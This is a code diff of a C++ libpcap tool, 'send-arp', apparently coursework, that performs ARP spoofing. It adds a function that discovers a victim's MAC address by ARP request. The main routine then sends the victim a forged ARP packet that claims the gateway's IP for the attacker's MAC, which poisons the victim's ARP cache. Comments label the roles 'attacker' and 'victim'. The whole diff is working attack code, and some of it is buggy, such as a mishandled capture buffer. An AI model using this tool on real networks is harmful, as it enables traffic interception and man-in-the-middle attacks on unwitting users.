@@ -2,9 +2,11 @@
 #include <pcap.h>
 #include <iostream>
 #include <cstring>
+
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "get_mac.h"
+#include "get_ip.h"
 
 using namespace std;
 
@@ -15,12 +17,69 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+string myIp;
+string myMac; //my(Attacker Mac)
+
+pcap_t* handle;
+
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int main(int argc, char* argv[]) {
+Mac send_arp(const char* vicIp){
+	EthArpPacket packet; //arp request packet
+
+	//sender = ma, target = victim
+	packet.eth_.smac_ = Mac(myMac);
+	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	
+	//My info
+	packet.arp_.smac_ = Mac(myMac);
+	packet.arp_.sip_ = htonl(Ip(myIp));
+
+	//Victim
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
+	packet.arp_.tip_ = htonl(Ip(vicIp));
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));	
+
+	while (true) {
+		EthArpPacket cap_packet;
+		struct pcap_pkthdr* header;
+		int res = pcap_next_ex(handle, &header, reinterpret_cast<const u_char**>(&cap_packet));
+
+		if (res == 0) continue;
+
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+
+		/*Check ARP Pakcet*/
+		
+		//Check ARP Packet -> continue packet capture
+		if(cap_packet.eth_.type()!=EthHdr::Arp) continue;
+
+		//Check reply packet
+		if(cap_packet.arp_.op()!=ArpHdr::Reply) continue;
+
+		//Check correct sender
+		if(cap_packet.arp_.sip()!=htonl(Ip(vicIp))) continue;
+
+		return cap_packet.arp_.smac();
+	}
+	return NULL;
+}
+
+int main(int argc,	char* argv[]) {
 	if (argc != 4) {
 		usage();
 		return -1;
@@ -31,7 +90,7 @@ int main(int argc, char* argv[]) {
 	char* gateIp = argv[3]; //target ip
 
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(interf, 0, 0, 0, errbuf);
+	handle = pcap_open_live(interf, 0, 0, 0, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
 		return -1;
@@ -40,13 +99,14 @@ int main(int argc, char* argv[]) {
 	EthArpPacket packet;
 	string interface = interf;
 
-	//get my(attacker)'s mac address
-	string myMac = get_mac(interface); 
+	//get my(attacker)'s address
+	myIp = get_ip(interface);
+	myMac = get_mac(interface); 
 
-	string vicMac = "5a:c9:0b:85:08:12";
+	Mac vicMac = send_arp(vicIp);
 
 	packet.eth_.smac_ = Mac(myMac);
-	packet.eth_.dmac_ = Mac(vicMac);
+	packet.eth_.dmac_ = vicMac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -61,7 +121,7 @@ int main(int argc, char* argv[]) {
 	packet.arp_.sip_ = htonl(Ip(gateIp));
 	
 	//Victim
-	packet.arp_.tmac_ = Mac(vicMac);
+	packet.arp_.tmac_ = vicMac;
 	packet.arp_.tip_ = htonl(Ip(gateIp)); 
 
 	/*
